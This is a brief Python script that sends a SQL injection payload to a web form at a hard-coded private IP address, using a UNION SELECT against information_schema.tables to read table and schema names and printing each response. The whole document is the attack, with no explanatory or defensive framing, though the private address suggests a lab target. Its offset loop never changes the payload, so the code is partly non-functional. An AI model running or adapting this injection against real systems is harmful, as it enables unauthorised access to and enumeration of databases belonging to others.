import requests

def send_injection(url, start_offset, end_offset):
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    for offset in range(start_offset, end_offset + 1):
        data = "id=1 UNION SELECT (SELECT CONCAT(table_name, table_schema) FROM information_schema.tables LIMIT 1), 3&submit=Send"
        response = requests.post(url, headers=headers, data=data)
        print(f"Offset: {offset}, Response: {response.text}")

if __name__ == "__main__":
    url = "http://172.23.121.172"
    start_offset = 0
    end_offset = 1
    send_injection(url, start_offset, end_offset)
